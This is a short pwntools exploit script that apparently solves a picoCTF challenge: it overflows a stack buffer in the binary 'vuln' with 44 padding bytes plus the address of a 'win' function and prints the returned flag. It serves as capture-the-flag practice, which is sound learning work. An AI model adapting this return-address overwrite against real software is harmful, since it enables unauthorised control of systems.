#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51023)

    return r


def main():
    r = conn()

    r.sendlineafter(b': \n', 
        b'A'*44 + 
        p32(exe.symbols.win)
    )

    r.recvline()

    while True:
        print(r.recvuntil(b'}'))

    r.interactive()


if __name__ == "__main__":
    main()
